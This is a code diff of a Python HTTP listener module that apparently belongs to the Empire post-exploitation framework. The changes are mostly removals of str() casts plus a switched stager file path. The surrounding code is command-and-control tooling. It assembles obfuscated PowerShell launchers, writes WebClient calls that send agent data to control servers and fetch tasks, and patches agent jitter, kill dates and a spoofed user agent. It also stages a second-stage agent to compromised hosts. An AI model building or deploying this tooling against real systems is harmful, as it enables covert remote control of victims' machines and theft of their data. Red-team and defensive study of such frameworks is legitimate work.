@@ -371,14 +371,14 @@ class Listener(object):
 
                 # ==== SEND REQUEST ====
                 if profile.stager.client.verb.lower() != "get" or profile.stager.client.body:
-                    launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".UploadData($ser+$t,'"+str(profile.stager.client.verb)+"','"+str(profile.stager.client.body)+"')\n")
+                    launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".UploadData($ser+$t,'"+ profile.stager.client.verb +"','"+ profile.stager.client.body +"')\n")
                 else:
                     launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".DownloadData($ser+$t);")
 
                 # ==== INTERPRET RESPONSE ====
                 if profile.stager.server.output.terminator.type == malleable.Terminator.HEADER:
                     launcherBase += helpers.randomize_capitalization("$"+vData+"='';for ($i=0;$i -lt $"+vWc+".ResponseHeaders.Count;$i++){")
-                    launcherBase += helpers.randomize_capitalization("if ($"+vData+".ResponseHeaders.GetKey($i) -eq '"+str(profile.stager.server.output.terminator.arg)+"'){")
+                    launcherBase += helpers.randomize_capitalization("if ($"+vData+".ResponseHeaders.GetKey($i) -eq '"+ profile.stager.server.output.terminator.arg +"'){")
                     launcherBase += helpers.randomize_capitalization("$"+vData+"=$"+vWc+".ResponseHeaders.Get($i);")
                     launcherBase += helpers.randomize_capitalization("Add-Type -AssemblyName System.Web;$"+vData+"=[System.Web.HttpUtility]::UrlDecode($"+vData+");")
                     launcherBase += "}}"
@@ -544,7 +544,7 @@ class Listener(object):
         if language.lower() == 'powershell':
 
             # read in the stager base
-            f = open("%s/data/agent/stagers/http_com.ps1" % (self.mainMenu.installPath))
+            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
 
@@ -680,7 +680,7 @@ class Listener(object):
             code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
             code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profileStr) + "\"")
             code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
-            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "' + str(b64DefaultResponse)+'"')
+            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "' + b64DefaultResponse +'"')
 
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
@@ -803,7 +803,7 @@ class Listener(object):
 
                 # ==== SEND REQUEST ====
                 if profile.get.client.verb.lower() != "get" or profile.get.client.body or profile.get.client.metadata.terminator.type == malleable.Terminator.PRINT:
-                    getTask += "$result = $"+vWc+".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"+str(profile.get.client.verb)+"', [System.Text.Encoding]::Default.GetBytes('"+str(profile.get.client.body)+"'));"
+                    getTask += "$result = $"+vWc+".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"+ profile.get.client.verb +"', [System.Text.Encoding]::Default.GetBytes('"+ profile.get.client.body +"'));"
                 else:
                     getTask += "$result = $"+vWc+".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
@@ -890,7 +890,7 @@ class Listener(object):
                 # ==== SEND REQUEST ====
                 sendMessage += "try {"
                 if profile.post.client.verb.lower() != "get" or profile.post.client.body or profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
-                    sendMessage += "$result = $"+vWc+".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"+str(profile.post.client.verb.upper())+"', [System.Text.Encoding]::Default.GetBytes($body));"
+                    sendMessage += "$result = $"+vWc+".UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '"+ profile.post.client.verb.upper() +"', [System.Text.Encoding]::Default.GetBytes($body));"
                 else:
                     sendMessage += "$result = $"+vWc+".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
@@ -933,7 +933,7 @@ class Listener(object):
                 sendMessage += "\n".join(["        " + _ for _ in profile.post.client.output.generate_python("routingPacket").split("\n")]) + "\n"
 
                 # ==== CHOOSE URI ====
-                sendMessage += "        taskUri = random.sample("+str(profile.post.client.uris)+", 1)[0]\n"
+                sendMessage += "        taskUri = random.sample("+ profile.post.client.uris +", 1)[0]\n"
                 sendMessage += "        requestUri = server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
@@ -972,7 +972,7 @@ class Listener(object):
                 sendMessage += "\n".join(["        " + _ for _ in profile.get.client.metadata.generate_python("routingPacket").split("\n")]) + "\n"
 
                 # ==== CHOOSE URI ====
-                sendMessage += "        taskUri = random.sample("+str(profile.get.client.uris)+", 1)[0]\n"
+                sendMessage += "        taskUri = random.sample("+ profile.get.client.uris +", 1)[0]\n"
                 sendMessage += "        requestUri = server + taskUri\n"
 
                 # ==== ADD PARAMETERS ====
@@ -1152,7 +1152,7 @@ class Listener(object):
                                         # step 6 of negotiation -> server sends patched agent (stage 2)
 
                                         if ':' in clientIP:
-                                            clientIP = '[' + str(clientIP) + ']'
+                                            clientIP = '[' + clientIP + ']'
                                         sessionID = results.split(b' ')[1].strip().decode('UTF-8')
                                         sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
 
